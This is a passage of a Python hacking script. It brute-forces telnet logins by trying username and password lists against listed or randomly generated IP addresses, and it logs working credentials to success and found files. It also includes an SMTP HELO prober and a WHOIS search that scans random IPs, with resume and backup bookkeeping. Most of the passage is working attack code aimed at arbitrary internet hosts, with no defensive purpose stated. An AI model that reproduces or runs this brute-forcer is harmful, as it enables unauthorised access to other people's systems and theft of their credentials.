		print ("hack = ",hack,"ip_idx:",ip_idx, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout)

		reality= Hacksmtp_helo(ipnumber, port, timeout)

		if (reality == True):
			WriteSuccessFile(successfile, ipnumber, port, user_idx, pwd_idx)
		else:
			print ("No HELO today!")
		
		ip_idx += 1
		
		WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target)

	print ("Bye bye, smtp helo hacking finished")
	quit()

############################ Telnet scanning (add others as needed) ####################################
if (hack == "telnet"):

	wait = int (timeout)
	print ("single_crack:\t",single_crack, type(single_crack))
	print ("start_user_idx\t",start_user_idx, type(start_user_idx))
	#quit ("resume stuff (telnet module)")

	#print ("ipnumbers_array:",ipnumbers_array)
	print ("type is:",type(ipnumbers_array))
	while (ip_idx < len(ipnumbers_array)): 
		
		
		# *** Time bit for regular bookmark backups ***
		(lap_time, hours) = HourlyBackup(hourly_backup, lap_time, save_name, hours)
		print ("Out of sub: Hours:",hours, "lap time:", lap_time)

		
		
		execute = "cp " + save_name+ " " + save_name + ".bak"
		print (execute)
		os.system(execute)
		time.sleep (0.1)
		
		if (ipfile == False and single_crack == False):
			ip_idx = 0
			ipnumber = GetRandomIP()
		else:
			ipnumber = ipnumbers_array[ip_idx]
		
		#if (resume == True):
		
		if (single_crack == True):	
			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target)		
		else:			
			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target)
			
		
		
		print ("hack = ",hack,"ip_idx:",ip_idx, "keepfound:",keepfound, type(keepfound), "foundfile:",foundfile, "successfile:",successfile)
		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout)
		for user_idx in range (start_user_idx, len(usernames_array)):
			
			if (single_crack == True):	
				WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target)
			else:			
				WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target)
						
			username = usernames_array[user_idx]
			for pwd_idx in range (start_pwd_idx, len(passwords_array)):
				
				password = passwords_array[pwd_idx]
				print ("Wait ",timeout,"secs for potential reconnect timeout... (not in subroutine)")
				time.sleep (timeout)

				#test to see if we're online
				test_counter += 1
				DoOnlineTest(number_of_pings, ping_target, test_counter, test_interval)
				time.sleep (0.1)
				print ("Trying ",ipnumber,":",port, "Username:", username, "Password:",password)		
				
				reality = HackTelnet (ipnumber, port, username, password, timeout)
				if (reality == True):
					WriteSuccessFile(successfile, ipnumber, port, username, password)
					if (keepfound == True):
						WriteFoundFile(foundfile, ipnumber, port, username, password)
				if (reality == False):
					print ("SORRY, NO FISH TODAY!")
					if (keepfound == True):
						WriteFoundFile(foundfile, ipnumber, port, username, password)

				if (single_crack == True):	
					WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target)
				else:			
					WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target)

				print ("\t\t**** INDEX:",ip_idx,"****")
				print ("\t\t**** INDEX:",ip_idx,"****")
				print ("\t\t**** INDEX:",ip_idx,"****")
				if (reality == "BADIP"):
					print ("BAD IP ADDRESS, skipping...")
					print ("index:",ip_idx)
					#del (ipnumbers_array[ip_idx])
					break
					# This loses nesting but it doesn't need it as it's a bad IP
					
			start_pwd_idx = 0

			if (reality == "BADIP"):	break
		# DANGER - ABOVE LINE (break) may cause an INFINITE LOOP
		ip_idx += 1
		start_user_idx = 0
		start_pwd_idx = 0

###################################### WHOIS SCANNING ############################################
if hack == "searchwhois:":
	user_idx = "n/a"
	pwd_idx = "n/a"

	print ("Searchwhois selected!")
	#print (foundfile)
	if (foundfile == "found.txt"):
		foundfile = "WHOISsearch.txt"
	#print (foundfile)
	#quit()

	searchfor = GetOption ("searchwhois:")
	print ("found ",searchfor, "in GetOption")
	print ("Will search WHOIS database for ",searchfor)
	loop = 0
	while (ip_idx < len(ipnumbers_array)):
		print ("#### LOOPED ",loop,"TIMES ###") 
		test_counter += 1
		DoOnlineTest(number_of_pings, ping_target, test_interval, test_counter)
		randno = random.randint (1, 5)
		print ("#################")
		print ("# randno: ",randno,"#")
		print ("#################")
		time.sleep (randno)
		if (ipfile == False and single_crack == False):
			ip_idx = 0
			ipnumber = GetRandomIP()
		else:
			ipnumber = ipnumbers_array[ip_idx]
		reality = SearchWHOIS (ipnumber, searchfor)
		if (reality == True):
			print ("Found",searchfor,"in WHOIS database, saving")
			#WriteSuccessFile (successfile, ipnumber, 
			WriteFoundFile (foundfile, ipnumber, "n/a", searchfor, "n/a")
		ip_idx += 1
		loop += 1

		if (single_crack == False):	
			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target)
		else:			
			WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, "n/a", hourly_backup, test_interval, number_of_pings, ping_target)

print ("It's all over!")
